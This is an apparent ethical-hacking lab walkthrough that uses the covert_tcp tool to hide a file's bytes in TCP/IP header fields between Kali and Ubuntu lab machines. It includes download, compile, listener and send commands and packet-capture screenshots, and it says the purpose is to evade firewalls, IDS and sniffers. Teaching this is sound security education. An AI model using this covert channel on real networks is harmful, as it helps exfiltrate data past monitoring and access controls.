# Covert Channels using Cover_TCP
This program manipulates the TCP/IP header to transfer a file one byte at a time to a destination host.

Networks use network access control permissions to permit/deny the traffic through them. Tunneling is used to bypass the access control rules of firewalls, IDS, IPS, web proxies to allow certain traffic. Covert channels can be made by inserting data into unused fields of protocol headers. There are many unused or misued fields in TCP or IP over which data can be sent to bypass firewalls.

### `Covert_TCP`
Covert_TCP manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted insied a IP header. This is useful when bypassing firewalls and sending data with legitimate looking packets that contain no data for sniffers to analyze.

### Objectives
* How to carry covert traffic inside of unused fields of TCP and IP headers.

### Requisites
* Windows Server 2016/2012 virtual machine.
* Kali Linux virtual machine.
* Ubuntu Linux virtual machine.

***
### Make a Secret Message File
In the Kali Linux, launch a new Terminal window.

1. Create a folder named **send** on your **Desktop**, and navigate into it:<br>
`cd Desktop`<br>
`mkdir send`<br>
`cd send`

2. Create a text file called **message.txt** inside **send** folder containing the string: **Secret Message!**<br>
`echo "Secret Message!" > message.txt`

### Compile **convert_tcp**
3. Download the **covert_tcp.c** file on the **send folder:**<br>
`wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c`

4. Compile the convert_tcp.c file:<br>
`cc -o covert_tcp covert_tcp.c`<br><br>
![covert-compile-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/d1ba707cb8661a70e9081b65d5aec738b1a31d8e/covert-1.png)

### Make a Receiving Destination
5. Go to your Ubuntu and open a new Terminal window.

6. Switch to super-user access:
`sudo su`

7. Start the **[tcpdump](https://www.lifewire.com/tcpdump-linux-command-unix-command-4097081)** as shown below:<br>
`tcpdump -nvvX port 8888 -i lo`<br><br>
![tcp-dump-ubuntu-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3667d22752bffd47fb4bdc59cd292264d2678674/covert-2.png)

8. Leave the **tcpdump listener** running and open another Terminal window or tab.

9. Go to Desktop and create a folder named **receive** and navigate into it:<br>
`cd Desktop`<br>
`mkdir receive`<br>
`cd receive`

10. Download the **covert_tcp.c** file on the **receive folder:**<br>
`wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c`

11. Compile the convert_tcp.c file:<br>
`cc -o covert_tcp covert_tcp.c`<br><br>
Note: In case you got some errors about `cc` command, install the compiler:
`sudo apt install gcc`

### Setup a Listener 
12. Start the Listener [Dest=Ubuntu, Source=Kali]:<br>
`./covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 9999 -dest_port 8888 -server -file /home/s4msepi0l/Desktop/receive/receive.txt`<br><br>
![Ubuntu-tcplistener](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Listener-ubuntu-covert-4.png)

### Launch Wireshark on Kali
13. Go back to Kali and Launch the Wireshark.<br>
![wireshark-kali-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-5.png)

14. Start the Wireshark capturing, double click on your primary network interface item:<br>
![wirehsark-capturing-kali-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-6.png)

### Start Sending the **Secret Message**
15. Minimize the Wireshark and open a new Terminal window on your Kali, navigate to the **send** folder.
16. Start sending the contents of message.txt file over TCP.<br>
`/covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt`<br><br>
![sendsecretmessage](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-7.png)<br>
Covert_tcp starts sending the string one character at a time as shown above.<br>
If you switch to the termina window in Ubuntu, you will see the message beign received:<br><br>
![receivingsecretmessage](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-8.png)

### Analyze the Results
17. On your Ubuntu machine, stop the tcpdump pressing **Ctrl+C** as shown below:<br><br>
![tcpdump-stop](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/cover-9.png)
Tcpdump shows that no packets were captured in the network.

18. Navigate to **/Desktop/receive/** and double-click the **receive.txt** file to view its contents. You will see the full message saved in the file as shown below:<br><br>
![secretmessage-kali](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/covert-10.png)

19. Switch back to the **Kali and Stop the packet capturing on the Wireshark** by clicking on the top-left red switch.

20. Click on **Apply a display filter** field and type **tcp** to view only the TCP packets as show below:<br><br>
![apply-display-filter=tcp](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/wireshark-covert-11.png)


If you examine the communication between Ubuntu and Kali (10.0.2.46 - 10.0.2.42) you will find each character of the message string being **sent as individual packets over the network** show on the next screenshots:

Covert_tcp changes the header of the TCP packets and replaces it with the characters of the string one character at a time to send the message without being detected.

Packet 1, string: **S**
![tcp-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/s-tcp-12.png)

Packet 2, string: **e**
![tcp-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/e-tcp-13.png)

Packet 3, string: **c**
![tcp-3](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/c-tcp-14.png)

Packet 4, string: **r**
![tcp-4](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/r-tcp-15.png)

(...) And so on until the entire message was completed.